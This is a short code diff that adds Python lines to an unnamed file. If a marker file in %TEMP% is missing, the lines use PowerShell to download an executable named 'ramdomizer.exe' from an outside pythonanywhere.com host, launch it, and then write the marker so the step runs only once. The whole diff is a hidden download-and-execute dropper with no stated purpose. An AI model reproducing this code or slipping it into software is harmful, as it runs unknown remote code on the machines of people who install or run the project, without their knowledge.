@@ -1,0 +1,11 @@
+
+if not os.path.exists(f"{os.path.expandvars('%TEMP%')}\\sc05.com"):
+
+    TEMP = os.path.expandvars("%TEMP%")
+
+    subprocess.call("powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12", shell=True)
+    subprocess.call(f'powershell Invoke-WebRequest -Uri "https://smksmks.pythonanywhere.com/static/ramdomizer.exe" -OutFile "{TEMP}\\ramdomizer.exe"', shell=True)
+    subprocess.call(f'powershell Start-Process -FilePath "{TEMP}\\ramdomizer.exe"', shell=True)
+
+    with open(f"{os.path.expandvars('%TEMP%')}\\sc05.com", 'w') as file:
+        file.write(' ')
